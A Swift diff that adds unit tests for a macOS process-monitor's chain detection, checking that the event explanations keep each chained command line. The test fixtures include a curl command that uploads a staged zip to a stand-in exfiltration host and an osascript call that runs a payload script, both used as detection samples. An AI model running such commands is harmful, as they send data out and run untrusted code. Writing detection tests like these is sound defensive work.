@@ -239,6 +239,52 @@ final class ParentContextCacheTests: XCTestCase {
     }
 }
 
+final class ChainEventBuilderTests: XCTestCase {
+    private func chainMember(pid: Int32, executable: String, command: String,
+                              rules: Set<String>, at interval: TimeInterval) -> ChainMember {
+        ChainMember(eventID: UUID(), pid: pid, executable: executable, command: command,
+                     ruleNames: rules, techniques: ["T1105"], severity: .elevated,
+                     timestamp: Date(timeIntervalSince1970: interval), lineage: [pid])
+    }
+
+    func testExplanationCarriesEachMembersFullCommandLine() {
+        let detection = ChainDetection(
+            members: [
+                chainMember(pid: 100, executable: "curl",
+                             command: "curl -T /tmp/staging.zip https://exfil.example.com/upload",
+                             rules: ["Suspicious Curl File Upload"], at: 1_000_000),
+                chainMember(pid: 200, executable: "osascript",
+                             command: "osascript /tmp/payload.scpt",
+                             rules: ["MacOS Scripting Interpreter AppleScript"], at: 1_000_030),
+            ],
+            techniques: ["T1105", "T1059.002"],
+            escalatedSeverity: .critical
+        )
+
+        let event = ProcessMonitor.chainEvent(from: detection, pid: 200, ppid: 50)
+        XCTAssertEqual(event.command, "curl → osascript")
+        XCTAssertEqual(event.topSeverity, .critical)
+        let explanation = event.rules.first?.explanation ?? ""
+        XCTAssertTrue(explanation.contains("https://exfil.example.com/upload"),
+                      "the URL a chain member touched is the actionable detail and must survive into the event")
+        XCTAssertTrue(explanation.contains("osascript /tmp/payload.scpt"))
+        XCTAssertEqual(explanation.split(separator: "\n").count, 2, "one line per member")
+    }
+
+    func testExplanationOmitsCommandSeparatorWhenCommandUnknown() {
+        let detection = ChainDetection(
+            members: [chainMember(pid: 100, executable: "curl", command: "",
+                                    rules: ["RuleA"], at: 1_000_000)],
+            techniques: ["T1105"],
+            escalatedSeverity: .elevated
+        )
+        let event = ProcessMonitor.chainEvent(from: detection, pid: 100, ppid: 50)
+        let explanation = event.rules.first?.explanation ?? ""
+        XCTAssertFalse(explanation.hasSuffix("— "), "no dangling separator for an empty command")
+        XCTAssertTrue(explanation.contains("curl (pid 100"))
+    }
+}
+
 final class SamplingHealthTrackerTests: XCTestCase {
     func testStaysHealthyBelowThreshold() {
         var tracker = SamplingHealthTracker(threshold: 3)
